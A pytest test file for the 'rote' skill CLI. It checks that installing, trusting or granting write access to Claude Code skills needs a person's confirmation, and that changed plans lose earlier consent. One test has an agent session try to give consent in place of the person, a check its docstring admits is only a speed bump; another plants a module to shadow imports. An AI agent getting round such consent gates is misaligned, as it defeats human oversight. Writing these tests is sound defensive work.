def test_a_changed_plan_drops_the_write_consent(
    notes: Path,
    tmp_path: Path,
    fx: FixtureServer,
    capsys: pytest.CaptureFixture[str],
    monkeypatch: pytest.MonkeyPatch,
    again: str,
) -> None:
    with monkeypatch.context() as m:
        _person(m, Answer("confirm", "--yes", True))
        assert _cli(capsys, "skill", "trust", "note-taker", "--allow-writes")[0] == 0
    changed = {**NOTE_PIPELINE, "version": "0.2.0"}
    _emit_note_taker(tmp_path, changed)
    target = "note-taker" if again == "trust" else str(notes)
    # Adopting the re-emitted files needs the person, by trust or by install.
    status, _, err = _cli(capsys, "skill", again, target, "--yes")
    assert status == 2 and "needs the user at a terminal" in err
    with monkeypatch.context() as m:
        answers = [Answer("confirm", "--yes", True)]
        extra: list[str] = []
        if again == "install":
            answers.append(Answer("confirm", "--save-allow-rule", False))
            extra = ["--claude-project", str(tmp_path / "p")]
        _person(m, *answers)
        status, _, err = _cli(capsys, "skill", again, target, *extra)
    assert status == 0, err
    assert "the earlier write consent is dropped" in err
    record = _trust_record(notes)
    assert record is not None and "writes" not in record
    status, out = _write(capsys)
    assert status == 1 and fx.calls("write_note") == []


def test_consent_is_read_for_the_plan_the_skill_has_now(notes: Path) -> None:
    """Beside the file check: a consent recorded for another plan is no consent."""
    from dataclasses import replace

    from rote.skill_target import trust

    (app,) = [a for a in registered_apps() if a.path == notes.resolve()]
    assert app.trust is not None
    now = trust.scan(notes)
    current = {"plan_sha256": trust.plan_sha256(now), "tools": ["fx.write_note"]}
    other = {**current, "plan_sha256": "0" * 64}
    assert trust.write_consent(replace(app, trust={**app.trust, "writes": current}), now)
    assert not trust.write_consent(replace(app, trust={**app.trust, "writes": other}), now)
    assert not trust.write_consent(app, now)


# ───────── the install plan and the allow rule ─────────


def test_install_without_a_person_or_yes_writes_nothing(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    out_dir = _emit_docs_digest(capsys, tmp_path / "docs-digest")
    before = apps_path().read_text()
    status, out, err = _cli(capsys, "skill", "install", str(out_dir))
    assert status == 2
    assert "Pass --yes to apply it" in err
    assert apps_path().read_text() == before
    status, out, _ = _cli(capsys, "skill", "install", str(out_dir), "--json")
    payload = json.loads(out)
    assert status == 2 and payload["reason"] == "confirmation_required"
    assert payload["missing"] == ["--yes"]
    assert payload["next"][0]["command"].endswith("--json --yes")
    assert apps_path().read_text() == before


def test_install_yes_never_saves_the_allow_rule(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    out_dir = _emit_docs_digest(capsys, tmp_path / "docs-digest")
    project = tmp_path / "proj"
    status, out, _ = _cli(
        capsys,
        "skill",
        "install",
        str(out_dir),
        "--yes",
        "--json",
        "--claude-project",
        str(project),
    )
    payload = json.loads(out)
    assert status == 0 and payload["ok"] is True
    assert payload["allow_rule"]["saved"] is False
    assert "--save-allow-rule" in payload["allow_rule"]["next"][0]["command"]
    assert not (project / ".claude").exists()
    assert _trust_record(out_dir) is not None
    # The explicit flag saves it, merged into what is there.
    settings = project / ".claude" / "settings.local.json"
    settings.parent.mkdir(parents=True)
    settings.write_text(json.dumps({"permissions": {"allow": ["Bash(ls *)"]}, "model": "x"}))
    status, _, err = _cli(
        capsys,
        "skill",
        "install",
        str(out_dir),
        "--yes",
        "--save-allow-rule",
        "--claude-project",
        str(project),
    )
    assert status == 0, err
    assert json.loads(settings.read_text()) == {
        "permissions": {"allow": ["Bash(ls *)", RULE]},
        "model": "x",
    }


@pytest.mark.parametrize(
    "save", [True, False, DEFAULT], ids=["person-saves", "person-declines", "default-is-no"]
)
def test_a_person_is_asked_for_the_allow_rule_with_no_as_the_default(
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
    monkeypatch: pytest.MonkeyPatch,
    save: Any,
) -> None:
    out_dir = _emit_docs_digest(capsys, tmp_path / "docs-digest")
    project = tmp_path / "proj"
    person = _person(
        monkeypatch, Answer("confirm", "--yes", True), Answer("confirm", "--save-allow-rule", save)
    )
    status, _, err = _cli(
        capsys, "skill", "install", str(out_dir), "--claude-project", str(project)
    )
    assert status == 0, err
    assert [flag for _, flag, _ in person.asked] == ["--yes", "--save-allow-rule"]
    settings = project / ".claude" / "settings.local.json"
    if save is True:
        assert json.loads(settings.read_text()) == {"permissions": {"allow": [RULE]}}
    else:
        assert not settings.exists()


def test_a_person_who_declines_the_install_gets_nothing(
    tmp_path: Path, capsys: pytest.CaptureFixture[str], monkeypatch: pytest.MonkeyPatch
) -> None:
    out_dir = _emit_docs_digest(capsys, tmp_path / "docs-digest")
    person = _person(monkeypatch, Answer("confirm", "--yes", False))
    status, _, _ = _cli(capsys, "skill", "install", str(out_dir))
    assert status == 1
    assert person.asked == [("confirm", "--yes", "Apply this plan?")]
    assert _trust_record(out_dir) is None


def test_the_allow_rule_goes_to_the_project_the_skill_lives_in(tmp_path: Path) -> None:
    from rote.skill_target.allow_rule import default_project

    repo = tmp_path / "repo"
    assert default_project(repo / ".claude" / "skills" / "x", tmp_path / "cwd") == repo
    assert default_project(tmp_path / "out" / "x", tmp_path / "cwd") == tmp_path / "cwd"


def test_in_a_git_repo_the_rule_goes_to_its_root_and_a_tracked_file_is_warned_about(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Claude Code 2.1.211+ keeps the local file at the repo root, and keeps it out
    of git only when it creates the file itself (through the global excludes,
    which this machine's may already hold: git's own config is moved here)."""
    import subprocess

    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(tmp_path / "gitconfig"))
    monkeypatch.setenv("GIT_CONFIG_NOSYSTEM", "1")
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "xdg"))

    from rote.skill_target.allow_rule import allow_rule_action, default_project

    repo = tmp_path / "repo"
    (repo / "sub").mkdir(parents=True)
    subprocess.run(["git", "init", "-q", str(repo)], check=True)
    assert default_project(tmp_path / "out" / "x", repo / "sub") == repo.resolve()
    action = allow_rule_action("docs-digest", repo, "cmd")
    assert action is not None and "Warning: git does not ignore .claude/settings.local.json" in (
        action.title
    )
    (repo / ".gitignore").write_text(".claude/settings.local.json\n")
    action = allow_rule_action("docs-digest", repo, "cmd")
    assert action is not None and "Warning" not in action.title


def test_install_names_a_dir_that_does_not_exist(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    status, _, err = _cli(capsys, "skill", "install", str(tmp_path / "nope"))
    assert status == 2
    assert f"error: {tmp_path / 'nope'} does not exist or is not a directory." in err


def test_an_agent_cannot_claim_to_be_the_person(
    notes: Path, capsys: pytest.CaptureFixture[str], monkeypatch: pytest.MonkeyPatch
) -> None:
    """--agent-mode no makes rote ask, but a detected caller still cannot give
    the consent no flag gives: a speed bump, documented as one."""
    prompter = ScriptedPrompter([Answer("confirm", "--yes", True)])
    monkeypatch.setattr("rote.interact.prompter.prompter_for", lambda mode: prompter)
    monkeypatch.setenv("CLAUDE_CODE_CHILD_SESSION", "1")
    before = apps_path().read_text()
    status, _, err = _cli(
        capsys, "skill", "trust", "note-taker", "--allow-writes", "--agent-mode", "no"
    )
    assert status == 2 and "needs the user at a terminal" in err
    assert prompter.asked == [] and apps_path().read_text() == before


def test_installing_a_second_dir_under_the_same_name_needs_force(
    digest: Path,
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    second = _emit_docs_digest(capsys, tmp_path / "second" / "docs-digest")
    for flags in (["--yes"], ["--yes", "--force"]):
        status, _, err = _cli(capsys, "skill", "install", str(second), *flags)
        assert status == 2 and "needs the user at a terminal" in err
        assert _trust_record(second) is None
    with monkeypatch.context() as m:
        person = _person(
            m, Answer("confirm", "--yes", True), Answer("confirm", "--save-allow-rule", False)
        )
        status, _, err = _cli(
            capsys, "skill", "install", str(second), "--claude-project", str(tmp_path / "p")
        )
    assert status == 0, err
    assert person.asked[0][1] == "--yes"
    assert f"replaces the install of docs-digest from {digest.resolve()}" in err
    assert _trust_record(digest) is None and _trust_record(second) is not None


# ───────── list and runs ─────────


def test_list_says_which_skills_would_run(
    digest: Path, tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    status, out, _ = _cli(capsys, "skill", "list", "--json")
    (row,) = json.loads(out)["skills"]
    assert status == 0 and (row["name"], row["status"], row["fix"]) == (
        "docs-digest",
        "installed",
        None,
    )
    (digest / "scripts/json.py").write_text("")
    status, out, _ = _cli(capsys, "skill", "list", "--json")
    (row,) = json.loads(out)["skills"]
    assert row["status"] == "refused"
    assert "not in the install record: scripts/json.py" in row["detail"]
    assert row["fix"] == "ask the user to review the change and run: rote skill trust docs-digest"


def test_runs_lists_every_run_and_prune_removes_only_expired_ones(
    digest: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    status, done, _ = _start(capsys)
    assert status == 0
    status, again, _ = _start(capsys)
    old = header(done)["run"]
    status, out, _ = _cli(capsys, "skill", "runs", "--json")
    assert {(r["skill"], r["state"]) for r in json.loads(out)["runs"]} == {("docs-digest", "done")}
    assert len(json.loads(out)["runs"]) == 2
    from rote.skill_target._driver import run_root

    journal = run_root() / "docs-digest" / old / "run.json"
    state = json.loads(journal.read_text())
    state["updated"] = 0
    journal.write_text(json.dumps(state))
    status, out, _ = _cli(capsys, "skill", "runs", "--prune", "--json")
    payload = json.loads(out)
    assert payload["pruned"] == {"docs-digest": [old]}
    assert [r["run"] for r in payload["runs"]] == [header(again)["run"]]


def test_a_module_in_the_callers_directory_cannot_shadow_an_import(
    digest: Path,
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The agent's cwd is never on the driver's path (-I), and PYTHON*
    variables are never read: a planted json.py or PYTHONPATH changes nothing."""
    cwd = tmp_path / "cwd"
    cwd.mkdir()
    (cwd / "json.py").write_text("raise SystemExit(9)\n")
    (cwd / "_rote_skill.py").write_text("raise SystemExit(9)\n")
    monkeypatch.chdir(cwd)
    monkeypatch.setenv("PYTHONPATH", str(cwd))
    status, out, err = _start(capsys)
    assert status == 0, out + err
    assert header(out)["kind"] == "DONE"


def test_run_passes_the_driver_command_through(
    digest: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    status, out, _ = _cli(capsys, "skill", "run", "docs-digest", "bogus")
    assert status == 2
    assert out.startswith("ROTE/1 ERROR docs-digest\nbogus is not a command here.")
    assert os.environ.get("ROTE_SKILL_RUN_DIR")  # conftest isolation stayed in place


# ───────── start-up cost: every block pays it ─────────


def test_skill_run_skips_the_cli_and_the_ir(digest: Path) -> None:
    """``rote skill run`` goes from the console script straight to the launcher.

    The full CLI imports the compiler, the adapters and the IR to build its
    parser (measured 170 ms of a 2.5 s ``start``); the launcher needs none of
    them. Run the real entry point in a fresh interpreter and list what it
    imported."""
    import subprocess
    import sys

    probe = (
        "import sys\n"
        "from rote.entry import main\n"
        "status = main(['skill', 'run', 'docs-digest', 'bogus'])\n"
        "heavy = ('rote.cli', 'rote.ir', 'rote.compiler', 'anthropic')\n"
        "print('LOADED', [m for m in heavy if m in sys.modules], status)\n"
    )
    done = subprocess.run(
        [sys.executable, "-I", "-c", probe], capture_output=True, text=True, timeout=60
    )
    assert done.returncode == 0, done.stdout + done.stderr
    assert done.stdout.startswith("ROTE/1 ERROR docs-digest\nbogus is not a command here.")
    assert done.stdout.splitlines()[-1] == "LOADED [] 2"


def test_skill_run_forms_the_fast_path_does_not_take_reach_the_cli(
    capsys: pytest.CaptureFixture[str],
) -> None:
    """``-h`` or a missing name is argparse's to answer, as before."""
    from rote.entry import main as entry_main

    with pytest.raises(SystemExit) as exited:
        entry_main(["skill", "run"])
    assert exited.value.code == 2
    assert "the following arguments are required: name" in capsys.readouterr().err


SKILL_RUN_FORMS = [
    ["skill", "run", "d"],
    ["skill", "run", "d", "start", '{"a": 1}'],
    ["skill", "run", "d", "start", "--file", "in.json"],
    ["skill", "run", "d", "answer", "r1", "s1", "{}", "--said", "yes"],
    ["skill", "run", "d", "--", "start"],
    ["skill", "run", "d", "--"],
    ["skill", "run", "d", "--", "--", "x"],
    ["skill", "run", "d", "start", "--", "x"],
    ["skill", "run", "d", "-x"],
    ["skill", "run", "d", "--help"],
    ["skill", "run", "d", "-h"],
    ["skill", "run", "--", "d", "start"],
    ["skill", "run", "-h"],
    ["skill", "run"],
    ["skill", "list"],
    ["run", "d", "start"],
]


@pytest.mark.parametrize("argv", SKILL_RUN_FORMS, ids=" ".join)
def test_the_fast_path_reads_skill_run_exactly_as_the_cli_parser(argv: list[str]) -> None:
    """Every form the fast path takes, it must read as argparse does; the rest it
    leaves to the CLI. A new option on `skill run` that argparse reads
    differently fails here instead of drifting."""
    from rote.cli import _build_parser
    from rote.entry import skill_run_args

    fast = skill_run_args(argv)
    if fast is None:
        return
    args = _build_parser().parse_args(argv)
    assert (args.command, args.skill_command) == ("skill", "run")
    assert (args.name, list(args.driver_args)) == fast


def test_the_cli_parser_does_not_import_the_anthropic_sdk() -> None:
    """``--help`` text reads the api driver's default model, which once imported
    the anthropic SDK (~490 ms) on every rote command."""
    import subprocess
    import sys

    probe = (
        "import sys\n"
        "import rote.cli\n"
        "rote.cli._build_parser()\n"
        "print([m for m in ('anthropic',) if m in sys.modules])\n"
    )
    done = subprocess.run(
        [sys.executable, "-I", "-c", probe], capture_output=True, text=True, timeout=60
    )
    assert done.returncode == 0, done.stderr
    assert done.stdout.strip() == "[]"


def test_the_driver_keeps_rotes_bytecode_and_writes_none_into_the_skill(
    digest: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """The child runs without ``-B``: on an install with no bytecode (``uv tool
    install``), ``-B`` recompiled fastmcp on every block (1.0 s against 0.5 s).
    The skill's own modules come from the frame and are never cached, so two
    real runs leave no ``__pycache__`` in the skill for the check to refuse."""
    import subprocess

    from rote.skill_target import launch

    argv = launch.driver_argv(0, [])
    flags = argv[: argv.index("-c")]
    done = subprocess.run(
        [*flags, "-c", "import sys; print(sys.flags.dont_write_bytecode)"],
        capture_output=True,
        text=True,
        timeout=60,
    )
    assert done.stdout.strip() == "0", done.stderr
    for _ in range(2):
        status, out, err = _start(capsys)
        assert status == 0, out + err
        assert header(out)["kind"] == "DONE"
    assert list(digest.rglob("__pycache__")) == []
